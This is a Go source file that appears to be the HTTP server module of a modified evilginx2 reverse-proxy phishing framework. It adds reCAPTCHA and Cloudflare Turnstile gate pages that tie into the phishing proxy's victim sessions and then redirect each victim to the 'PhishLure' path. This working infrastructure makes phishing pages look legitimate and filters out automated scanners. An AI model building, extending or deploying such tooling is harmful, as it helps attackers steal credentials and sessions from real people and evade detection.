package core

import (
    "github.com/gorilla/mux"
    "fmt"
    "github.com/kgretzky/evilginx2/log"
    "net/http"
    "encoding/json"
    "io/ioutil"
    "net/url"
    "time"
    "strings"
)

var recaptchaPublicKey string
var recaptchaPrivateKey string
var turnstilePublicKey string
var turnstilePrivateKey string 
var eproxy *HttpProxy
const recaptchaServerName = "https://www.google.com/recaptcha/api/siteverify"
const turnstileServerName = "https://challenges.cloudflare.com/turnstile/v0/siteverify"

type HttpServer struct {
    srv        *http.Server
    acmeTokens map[string]string
}

type RecaptchaResponse struct {
    Success     bool      `json:"success"`
    ChallengeTS time.Time `json:"challenge_ts"`
    Hostname    string    `json:"hostname"`
    ErrorCodes  []string  `json:"error-codes"`
}

func NewHttpServer(capPub string, capPriv string, tPub string, tPriv string, captcha bool, turnstile bool) (*HttpServer, error) {
    s := &HttpServer{}
    s.acmeTokens = make(map[string]string)

    if captcha {
        recaptchaPublicKey = capPub
        recaptchaPrivateKey = capPriv
    } else if turnstile {
        turnstilePublicKey = tPub
        turnstilePrivateKey = tPriv
    }

    r := mux.NewRouter()
    s.srv = &http.Server{
        Handler:      r,
        Addr:         "0.0.0.0:80",
        WriteTimeout: 15 * time.Second,
        ReadTimeout:  15 * time.Second,
    }

    r.HandleFunc("/.well-known/acme-challenge/{token}", s.handleACMEChallenge).Methods("GET")
    r.HandleFunc("/recaptcha", s.captchaPage)
    r.HandleFunc("/verify", s.turnstilePage)
    r.PathPrefix("/").HandlerFunc(s.handleRedirect)

    return s, nil
}

func (s *HttpServer) Start(inProxy *HttpProxy) {
    eproxy = inProxy
    go s.srv.ListenAndServe()
}

func (s *HttpServer) AddACMEToken(token string, keyAuth string) {
    s.acmeTokens[token] = keyAuth
}

func (s *HttpServer) ClearACMETokens() {
    s.acmeTokens = make(map[string]string)
}

func (s *HttpServer) handleACMEChallenge(w http.ResponseWriter, r *http.Request) {
    vars := mux.Vars(r)
    token := vars["token"]

    key, ok := s.acmeTokens[token]
    if !ok {
        w.WriteHeader(http.StatusNotFound)
        return
    }

    log.Debug("http: found ACME verification token for URL: %s", r.URL.Path)
    w.WriteHeader(http.StatusOK)
    w.Header().Set("content-type", "text/plain")
    w.Write([]byte(key))
}

func (s *HttpServer) handleRedirect(w http.ResponseWriter, r *http.Request) {
    http.Redirect(w, r, "https://"+r.Host+r.URL.String(), http.StatusFound)
}

func checkRecaptcha(remoteip, response string) (result bool, err error) {
    resp, err := http.PostForm(recaptchaServerName,
        url.Values{"secret": {recaptchaPrivateKey}, "remoteip": {remoteip}, "response": {response}})
    if err != nil {
        log.Error("Post error: %s", err)
        return false, err
    }
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        log.Error("Read error: could not read body: %s", err)
        return false, err
    }
    r := RecaptchaResponse{}
    err = json.Unmarshal(body, &r)
    if err != nil {
        log.Error("Read error: got invalid JSON: %s", err)
        return false, err
    }
    return r.Success, nil
}

func checkTurnstile(remoteip, response string) (result bool, err error) {
    resp, err := http.PostForm(turnstileServerName,
        url.Values{"secret": {turnstilePrivateKey}, "remoteip": {remoteip}, "response": {response}})
    if err != nil {
        log.Error("Post error: %s", err)
        return false, err
    }
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        log.Error("Read error: could not read body: %s", err)
        return false, err
    }
    r := RecaptchaResponse{}
    err = json.Unmarshal(body, &r)
    if err != nil {
        log.Error("Read error: got invalid JSON: %s", err)
        return false, err
    }
    return r.Success, nil
}

const (
    style = `<body><div style="position: absolute; width: 300px; height: 200px; z-index: 15; top: 50%; left: 50%; margin: -100px 0 0 -150px;">
<style> input[type=button], input[type=submit], input[type=reset] {background-color: #2374f7; 
  border: none;
  border-radius: 5px; 
  color: white;
  padding: 5px 15px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin-top: 10px;} </style>`
    pageBottom = `</div></div></body></html>`
    message = `<p>%s</p>`
)

func processCaptcha(request *http.Request) (result bool) {
    parts := strings.SplitN(request.RemoteAddr, ":", 2)
    remote_addr := parts[0]
    recaptchaResponse, responseFound := request.Form["g-recaptcha-response"]
    if responseFound {
        result, err := checkRecaptcha(remote_addr, recaptchaResponse[0])
        if err != nil {
            log.Error("recaptcha server error", err)
        }
        return result
    }
    return false
}

func processTurnstile(request *http.Request) (result bool) {
    parts := strings.SplitN(request.RemoteAddr, ":", 2)
    remote_addr := parts[0]
    recaptchaResponse, responseFound := request.Form["cf-turnstile-response"]
    if responseFound {
        result, err := checkTurnstile(remote_addr, recaptchaResponse[0])
        if err != nil {
            log.Error("turnstile server error", err)
        }
        return result
    }
    return false
}

func (s *HttpServer) captchaPage(writer http.ResponseWriter, request *http.Request) {
    pageTop := `<!DOCTYPE HTML><html><head>
<title>reCAPTCHA</title></head>`
    isValid := false
    var session string
    for _, c := range request.Cookies() {
        if len(c.Name) == 4 && len(c.Value) == 64 {
            session = c.Value
            isValid = true
            break
        }
    }
    if !isValid || session == "" {
        writer.WriteHeader(http.StatusForbidden)
        writer.Write([]byte("Access denied."))
    } else {
        if s, ok := eproxy.sessions[session]; ok {
            form := `<form action="/recaptcha" method="POST">
            <script src="https://www.google.com/recaptcha/api.js"></script>
                <div class="g-recaptcha" data-sitekey="%s"></div>
            <input type="submit" name="button" value="Submit">
            </form>`
            err := request.ParseForm() 
            fmt.Fprint(writer, pageTop)
            fmt.Fprint(writer, style)
            if err != nil {
                log.Error("recaptcha form error", err)
            } else {
                _, buttonClicked := request.Form["button"]
                if buttonClicked {
                    if processCaptcha(request) {
                        s.IsCaptchaDone = true
                        redirect := `<script>window.location.replace('https://` + request.Host + s.PhishLure.Path + `');</script>`
                        fmt.Fprint(writer, redirect) 
                    } else {
                        fmt.Fprint(writer, fmt.Sprintf(message, "Please try again."))
                    }
                }
            }
            fmt.Fprint(writer, fmt.Sprintf(form, recaptchaPublicKey))
            fmt.Fprint(writer, pageBottom)
        } else {
            writer.WriteHeader(http.StatusForbidden)
            writer.Write([]byte("Access denied."))
        }
    }
}

func (s *HttpServer) turnstilePage(writer http.ResponseWriter, request *http.Request) {
    pageTop := `<!DOCTYPE HTML><html><head>
<title>Cloudflare</title></head>`
    isValid := false
    var session string
    for _, c := range request.Cookies() {
        if len(c.Name) == 4 && len(c.Value) == 64 {
            session = c.Value
            isValid = true
            break
        }
    }
    if !isValid || session == "" {
        writer.WriteHeader(http.StatusForbidden)
        writer.Write([]byte("Access denied."))
    } else {
        if s, ok := eproxy.sessions[session]; ok {
            form := `<form action="/verify" method="POST">
            <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
                <div class="cf-turnstile" data-sitekey="%s"></div>
            <input type="submit" name="button" value="Submit">
            </form>`
            err := request.ParseForm() 
                fmt.Fprint(writer, pageTop)
                fmt.Fprint(writer, style)
            if err != nil {
                log.Error("turnstile form error", err)
            } else {
                _, buttonClicked := request.Form["button"]
                if buttonClicked {
                    if processTurnstile(request) {
                        s.IsCaptchaDone = true
                        redirect := `<script>window.location.replace('https://` + request.Host + s.PhishLure.Path + `');</script>`
                        fmt.Fprint(writer, redirect) 
                    } else {
                        fmt.Fprint(writer, fmt.Sprintf(message, "Please try again."))
                    }
                }
            }
            fmt.Fprint(writer, fmt.Sprintf(form, turnstilePublicKey))
            fmt.Fprint(writer, pageBottom)
        } else {
            writer.WriteHeader(http.StatusForbidden)
            writer.Write([]byte("Access denied."))
        }
    }
}